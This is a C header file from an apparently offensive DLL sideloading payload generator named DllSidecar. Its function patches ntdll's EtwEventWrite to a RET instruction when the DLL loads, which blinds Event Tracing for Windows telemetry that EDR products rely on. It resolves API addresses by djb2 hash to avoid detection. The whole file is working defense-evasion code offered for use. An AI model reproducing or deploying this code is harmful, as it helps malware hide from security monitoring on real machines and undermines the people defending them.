/*
 * DllSidecar — etw.h
 * Patch ntdll!EtwEventWrite to RET, blinding the Event Tracing for Windows
 * provider channel that several EDRs subscribe to (notably the
 * Microsoft-Windows-Threat-Intelligence provider). Single-byte 0xC3 patch,
 * applied once at DllMain entry.
 *
 * The RET opcode is 0xC3 on both x64 and x86, so this header is arch-
 * independent. The patch only blinds telemetry written via EtwEventWrite
 * from this process onward — events that were already in the queue or
 * that travel via other providers are unaffected.
 *
 * The caller must define H_ETWEVENTWRITE (djb2 hash of "EtwEventWrite")
 * before including this header. The template engine emits the #define
 * immediately above the #include so the hash is produced by the same
 * djb2 routine the rest of the generator uses.
 *
 * @tunelko — BugAInters 2026
 */

#ifndef ETW_H
#define ETW_H

#include <windows.h>
#include "dinvoke.h"

#ifndef H_ETWEVENTWRITE
#error "Define H_ETWEVENTWRITE (djb2 of \"EtwEventWrite\") before including etw.h"
#endif

static void patch_etw(void) {
    PVOID ntdllBase = dinvoke_get_module(H_NTDLL_DLL);
    if (!ntdllBase) return;
    BYTE *pEtw = (BYTE *)dinvoke_get_proc(ntdllBase, H_ETWEVENTWRITE);
    if (!pEtw) return;

    DWORD oldProtect;
    if (!VirtualProtect(pEtw, 1, PAGE_EXECUTE_READWRITE, &oldProtect)) return;
    *pEtw = 0xC3;  /* RET — turns EtwEventWrite into an immediate no-op */
    DWORD dummy;
    VirtualProtect(pEtw, 1, oldProtect, &dummy);
}

#endif /* ETW_H */
